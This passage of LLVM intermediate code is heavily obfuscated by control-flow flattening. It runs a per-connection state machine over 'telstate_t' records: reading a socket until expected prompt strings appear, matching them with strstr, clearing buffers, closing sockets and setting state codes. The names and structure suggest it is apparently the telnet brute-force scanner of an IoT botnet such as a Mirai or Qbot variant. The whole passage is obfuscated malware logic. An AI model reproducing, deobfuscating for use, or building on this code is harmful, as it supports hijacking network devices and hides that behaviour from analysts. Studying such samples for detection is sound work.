  %.reload157 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload157, i64 %1533
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1534, i32 0, i32 0
  %1536 = load i32, i32* %1535, align 16
  %1537 = load i32, i32* %2, align 4
  %1538 = sext i32 %1537 to i64
  %.reload156 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload156, i64 %1538
  %1540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1539, i32 0, i32 8
  %1541 = load i8*, i8** %1540, align 8
  %1542 = load i32, i32* %2, align 4
  %1543 = sext i32 %1542 to i64
  %.reload155 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload155, i64 %1543
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1544, i32 0, i32 7
  %1546 = load i16, i16* %1545, align 16
  %1547 = zext i16 %1546 to i32
  %1548 = call i32 @readUntil(i32 %1536, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1541, i32 1024, i32 %1547)
  %1549 = icmp ne i32 %1548, 0
  %1550 = select i1 %1549, i32 -2115030442, i32 1676841725
  store i32 %1550, i32* %switchVar
  br label %loopEnd

; <label>:1551:                                   ; preds = %loopEntry
  %1552 = load i32, i32* %2, align 4
  %1553 = sext i32 %1552 to i64
  %.reload154 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload154, i64 %1553
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1554, i32 0, i32 6
  store i32 0, i32* %1555, align 4
  %1556 = load i32, i32* %2, align 4
  %1557 = sext i32 %1556 to i64
  %.reload153 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload153, i64 %1557
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1558, i32 0, i32 7
  store i16 0, i16* %1559, align 16
  %1560 = load i32, i32* %2, align 4
  %1561 = sext i32 %1560 to i64
  %.reload152 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload152, i64 %1561
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1562, i32 0, i32 8
  %1564 = load i8*, i8** %1563, align 8
  %1565 = call i8* @strstr(i8* %1564, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1566 = icmp ne i8* %1565, null
  %1567 = select i1 %1566, i32 1210736222, i32 1378410984
  store i32 %1567, i32* %switchVar
  br label %loopEnd

; <label>:1568:                                   ; preds = %loopEntry
  %1569 = load i32, i32* %2, align 4
  %1570 = sext i32 %1569 to i64
  %.reload151 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload151, i64 %1570
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1571, i32 0, i32 8
  %1573 = load i8*, i8** %1572, align 8
  call void @llvm.memset.p0i8.i64(i8* %1573, i8 0, i64 1024, i32 1, i1 false)
  %1574 = load i32, i32* %2, align 4
  %1575 = sext i32 %1574 to i64
  %.reload150 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload150, i64 %1575
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1576, i32 0, i32 0
  %1578 = load i32, i32* %1577, align 16
  %1579 = call i32 @sclose(i32 %1578)
  %1580 = load i32, i32* %2, align 4
  %1581 = sext i32 %1580 to i64
  %.reload149 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload149, i64 %1581
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1582, i32 0, i32 2
  store i8 0, i8* %1583, align 8
  %1584 = load i32, i32* %2, align 4
  %1585 = sext i32 %1584 to i64
  %.reload148 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload148, i64 %1585
  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1586, i32 0, i32 3
  store i8 0, i8* %1587, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1588:                                   ; preds = %loopEntry
  %1589 = load i32, i32* %2, align 4
  %1590 = sext i32 %1589 to i64
  %.reload147 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload147, i64 %1590
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1591, i32 0, i32 2
  store i8 7, i8* %1592, align 8
  store i32 -371651970, i32* %switchVar
  br label %loopEnd

; <label>:1593:                                   ; preds = %loopEntry
  %1594 = load i32, i32* %2, align 4
  %1595 = sext i32 %1594 to i64
  %.reload146 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload146, i64 %1595
  %1597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1596, i32 0, i32 8
  %1598 = load i8*, i8** %1597, align 8
  call void @llvm.memset.p0i8.i64(i8* %1598, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1599:                                   ; preds = %loopEntry
  %1600 = load i32, i32* %2, align 4
  %1601 = sext i32 %1600 to i64
  %.reload145 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload145, i64 %1601
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1602, i32 0, i32 0
  %1604 = load i32, i32* %1603, align 16
  %1605 = load i32, i32* %2, align 4
  %1606 = sext i32 %1605 to i64
  %.reload144 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload144, i64 %1606
  %1608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1607, i32 0, i32 8
  %1609 = load i8*, i8** %1608, align 8
  %1610 = load i32, i32* %2, align 4
  %1611 = sext i32 %1610 to i64
  %.reload143 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload143, i64 %1611
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1612, i32 0, i32 7
  %1614 = load i16, i16* %1613, align 16
  %1615 = zext i16 %1614 to i32
  %1616 = call i32 @readUntil(i32 %1604, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1609, i32 1024, i32 %1615)
  %1617 = icmp ne i32 %1616, 0
  %1618 = select i1 %1617, i32 495400496, i32 997283099
  store i32 %1618, i32* %switchVar
  br label %loopEnd

; <label>:1619:                                   ; preds = %loopEntry
  %1620 = load i32, i32* %2, align 4
  %1621 = sext i32 %1620 to i64
  %.reload142 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload142, i64 %1621
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1622, i32 0, i32 6
  store i32 0, i32* %1623, align 4
  %1624 = load i32, i32* %2, align 4
  %1625 = sext i32 %1624 to i64
  %.reload141 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload141, i64 %1625
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1626, i32 0, i32 7
  store i16 0, i16* %1627, align 16
  %1628 = load i32, i32* %2, align 4
  %1629 = sext i32 %1628 to i64
  %.reload140 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload140, i64 %1629
  %1631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1630, i32 0, i32 8
  %1632 = load i8*, i8** %1631, align 8
  %1633 = call i8* @strstr(i8* %1632, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1634 = icmp ne i8* %1633, null
  %1635 = select i1 %1634, i32 545733015, i32 -1484354052
  store i32 %1635, i32* %switchVar
  br label %loopEnd

; <label>:1636:                                   ; preds = %loopEntry
  %1637 = load i32, i32* %2, align 4
  %1638 = sext i32 %1637 to i64
  %.reload139 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload139, i64 %1638
  %1640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1639, i32 0, i32 8
  %1641 = load i8*, i8** %1640, align 8
  call void @llvm.memset.p0i8.i64(i8* %1641, i8 0, i64 1024, i32 1, i1 false)
  %1642 = load i32, i32* %2, align 4
  %1643 = sext i32 %1642 to i64
  %.reload138 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload138, i64 %1643
  %1645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1644, i32 0, i32 0
  %1646 = load i32, i32* %1645, align 16
  %1647 = call i32 @sclose(i32 %1646)
  %1648 = load i32, i32* %2, align 4
  %1649 = sext i32 %1648 to i64
  %.reload137 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload137, i64 %1649
  %1651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1650, i32 0, i32 2
  store i8 0, i8* %1651, align 8
  %1652 = load i32, i32* %2, align 4
  %1653 = sext i32 %1652 to i64
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload136, i64 %1653
  %1655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1654, i32 0, i32 3
  store i8 0, i8* %1655, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1656:                                   ; preds = %loopEntry
  %1657 = load i32, i32* %2, align 4
  %1658 = sext i32 %1657 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %1658
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1659, i32 0, i32 2
  store i8 7, i8* %1660, align 8
  store i32 1532237382, i32* %switchVar
  br label %loopEnd

; <label>:1661:                                   ; preds = %loopEntry
  %1662 = load i32, i32* %2, align 4
  %1663 = sext i32 %1662 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %1663
  %1665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1664, i32 0, i32 8
  %1666 = load i8*, i8** %1665, align 8
  call void @llvm.memset.p0i8.i64(i8* %1666, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1667:                                   ; preds = %loopEntry
  %1668 = load i32, i32* %2, align 4
  %1669 = sext i32 %1668 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %1669
  %1671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1670, i32 0, i32 0
  %1672 = load i32, i32* %1671, align 16
  %1673 = load i32, i32* %2, align 4
  %1674 = sext i32 %1673 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %1674
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1675, i32 0, i32 8
  %1677 = load i8*, i8** %1676, align 8
  %1678 = load i32, i32* %2, align 4
  %1679 = sext i32 %1678 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %1679
  %1681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1680, i32 0, i32 7
  %1682 = load i16, i16* %1681, align 16
  %1683 = zext i16 %1682 to i32
  %1684 = call i32 @readUntil(i32 %1672, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1677, i32 1024, i32 %1683)
  %1685 = icmp ne i32 %1684, 0
  %1686 = select i1 %1685, i32 -884164686, i32 862109110
  store i32 %1686, i32* %switchVar
  br label %loopEnd

; <label>:1687:                                   ; preds = %loopEntry
  %1688 = load i32, i32* %2, align 4
  %1689 = sext i32 %1688 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %1689
  %1691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1690, i32 0, i32 6
  store i32 0, i32* %1691, align 4
  %1692 = load i32, i32* %2, align 4
  %1693 = sext i32 %1692 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %1693
  %1695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1694, i32 0, i32 7
  store i16 0, i16* %1695, align 16
  %1696 = load i32, i32* %2, align 4
  %1697 = sext i32 %1696 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %1697
  %1699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1698, i32 0, i32 8
  %1700 = load i8*, i8** %1699, align 8
  %1701 = call i8* @strstr(i8* %1700, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1702 = icmp ne i8* %1701, null
  %1703 = select i1 %1702, i32 447374323, i32 -1485014862
  store i32 %1703, i32* %switchVar
  br label %loopEnd

; <label>:1704:                                   ; preds = %loopEntry
  %1705 = load i32, i32* %2, align 4
  %1706 = sext i32 %1705 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %1706
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1707, i32 0, i32 8
  %1709 = load i8*, i8** %1708, align 8
  call void @llvm.memset.p0i8.i64(i8* %1709, i8 0, i64 1024, i32 1, i1 false)
  %1710 = load i32, i32* %2, align 4
  %1711 = sext i32 %1710 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %1711
  %1713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1712, i32 0, i32 0
  %1714 = load i32, i32* %1713, align 16
  %1715 = call i32 @sclose(i32 %1714)
  %1716 = load i32, i32* %2, align 4
  %1717 = sext i32 %1716 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %1717
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1718, i32 0, i32 2
  store i8 0, i8* %1719, align 8
  %1720 = load i32, i32* %2, align 4
  %1721 = sext i32 %1720 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %1721
  %1723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1722, i32 0, i32 3
  store i8 0, i8* %1723, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1724:                                   ; preds = %loopEntry
  %1725 = load i32, i32* %2, align 4
  %1726 = sext i32 %1725 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %1726
  %1728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1727, i32 0, i32 2
  store i8 7, i8* %1728, align 8
  store i32 -1768113871, i32* %switchVar
  br label %loopEnd

; <label>:1729:                                   ; preds = %loopEntry
  %1730 = load i32, i32* %2, align 4
  %1731 = sext i32 %1730 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %1731
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1732, i32 0, i32 8
  %1734 = load i8*, i8** %1733, align 8
  call void @llvm.memset.p0i8.i64(i8* %1734, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1735:                                   ; preds = %loopEntry
  %1736 = load i32, i32* %2, align 4
  %1737 = sext i32 %1736 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %1737
  %1739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1738, i32 0, i32 0
  %1740 = load i32, i32* %1739, align 16
  %1741 = load i32, i32* %2, align 4
  %1742 = sext i32 %1741 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %1742
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1743, i32 0, i32 8
  %1745 = load i8*, i8** %1744, align 8
  %1746 = load i32, i32* %2, align 4
  %1747 = sext i32 %1746 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %1747
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1748, i32 0, i32 7
  %1750 = load i16, i16* %1749, align 16
  %1751 = zext i16 %1750 to i32
  %1752 = call i32 @readUntil(i32 %1740, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1745, i32 1024, i32 %1751)
  %1753 = icmp ne i32 %1752, 0
  %1754 = select i1 %1753, i32 862905573, i32 685831832
  store i32 %1754, i32* %switchVar
  br label %loopEnd

; <label>:1755:                                   ; preds = %loopEntry
  %1756 = load i32, i32* %2, align 4
  %1757 = sext i32 %1756 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %1757
  %1759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1758, i32 0, i32 6
  store i32 0, i32* %1759, align 4
  %1760 = load i32, i32* %2, align 4
  %1761 = sext i32 %1760 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %1761
  %1763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1762, i32 0, i32 7
  store i16 0, i16* %1763, align 16
  %1764 = load i32, i32* %2, align 4
  %1765 = sext i32 %1764 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %1765
  %1767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1766, i32 0, i32 8
  %1768 = load i8*, i8** %1767, align 8
  %1769 = call i8* @strstr(i8* %1768, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1770 = icmp ne i8* %1769, null
  %1771 = select i1 %1770, i32 615022647, i32 -291990480
  store i32 %1771, i32* %switchVar
  br label %loopEnd

; <label>:1772:                                   ; preds = %loopEntry
  %1773 = load i32, i32* %2, align 4
  %1774 = sext i32 %1773 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %1774
  %1776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1775, i32 0, i32 8
  %1777 = load i8*, i8** %1776, align 8
  call void @llvm.memset.p0i8.i64(i8* %1777, i8 0, i64 1024, i32 1, i1 false)
  %1778 = load i32, i32* %2, align 4
  %1779 = sext i32 %1778 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %1779
  %1781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1780, i32 0, i32 0
  %1782 = load i32, i32* %1781, align 16
  %1783 = call i32 @sclose(i32 %1782)
  %1784 = load i32, i32* %2, align 4
  %1785 = sext i32 %1784 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %1785
  %1787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1786, i32 0, i32 2
  store i8 0, i8* %1787, align 8
  %1788 = load i32, i32* %2, align 4
  %1789 = sext i32 %1788 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %1789
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1790, i32 0, i32 3
  store i8 0, i8* %1791, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1792:                                   ; preds = %loopEntry
  %1793 = load i32, i32* %2, align 4
  %1794 = sext i32 %1793 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %1794
  %1796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1795, i32 0, i32 2
  store i8 7, i8* %1796, align 8
  store i32 -2147128254, i32* %switchVar
  br label %loopEnd

; <label>:1797:                                   ; preds = %loopEntry
  %1798 = load i32, i32* %2, align 4
  %1799 = sext i32 %1798 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %1799
  %1801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1800, i32 0, i32 8
  %1802 = load i8*, i8** %1801, align 8
  call void @llvm.memset.p0i8.i64(i8* %1802, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1803:                                   ; preds = %loopEntry
  %1804 = load i32, i32* %2, align 4
  %1805 = sext i32 %1804 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %1805
  %1807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1806, i32 0, i32 0
  %1808 = load i32, i32* %1807, align 16
  %1809 = load i32, i32* %2, align 4
  %1810 = sext i32 %1809 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %1810
  %1812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1811, i32 0, i32 8
  %1813 = load i8*, i8** %1812, align 8
  %1814 = load i32, i32* %2, align 4
  %1815 = sext i32 %1814 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %1815
  %1817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1816, i32 0, i32 7
  %1818 = load i16, i16* %1817, align 16
  %1819 = zext i16 %1818 to i32
  %1820 = call i32 @readUntil(i32 %1808, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1813, i32 1024, i32 %1819)
  %1821 = icmp ne i32 %1820, 0
  %1822 = select i1 %1821, i32 78971064, i32 586233147
  store i32 %1822, i32* %switchVar
  br label %loopEnd

; <label>:1823:                                   ; preds = %loopEntry
  %1824 = load i32, i32* %2, align 4
  %1825 = sext i32 %1824 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %1825
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1826, i32 0, i32 6
  store i32 0, i32* %1827, align 4
  %1828 = load i32, i32* %2, align 4
  %1829 = sext i32 %1828 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %1829
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1830, i32 0, i32 7
  store i16 0, i16* %1831, align 16
  %1832 = load i32, i32* %2, align 4
  %1833 = sext i32 %1832 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %1833
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1834, i32 0, i32 8
  %1836 = load i8*, i8** %1835, align 8
  %1837 = call i8* @strstr(i8* %1836, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1838 = icmp ne i8* %1837, null
  %1839 = select i1 %1838, i32 611722345, i32 661490799
  store i32 %1839, i32* %switchVar
  br label %loopEnd

; <label>:1840:                                   ; preds = %loopEntry
  %1841 = load i32, i32* %2, align 4
  %1842 = sext i32 %1841 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %1842
  %1844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1843, i32 0, i32 8
  %1845 = load i8*, i8** %1844, align 8
  call void @llvm.memset.p0i8.i64(i8* %1845, i8 0, i64 1024, i32 1, i1 false)
  %1846 = load i32, i32* %2, align 4
  %1847 = sext i32 %1846 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %1847
  %1849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1848, i32 0, i32 0
  %1850 = load i32, i32* %1849, align 16
  %1851 = call i32 @sclose(i32 %1850)
  %1852 = load i32, i32* %2, align 4
  %1853 = sext i32 %1852 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %1853
  %1855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1854, i32 0, i32 2
  store i8 0, i8* %1855, align 8
  %1856 = load i32, i32* %2, align 4
  %1857 = sext i32 %1856 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %1857
  %1859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1858, i32 0, i32 3
  store i8 0, i8* %1859, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1860:                                   ; preds = %loopEntry
  %1861 = load i32, i32* %2, align 4
  %1862 = sext i32 %1861 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %1862
  %1864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1863, i32 0, i32 2
  store i8 7, i8* %1864, align 8
  store i32 908186744, i32* %switchVar
  br label %loopEnd

; <label>:1865:                                   ; preds = %loopEntry
  %1866 = load i32, i32* %2, align 4
  %1867 = sext i32 %1866 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
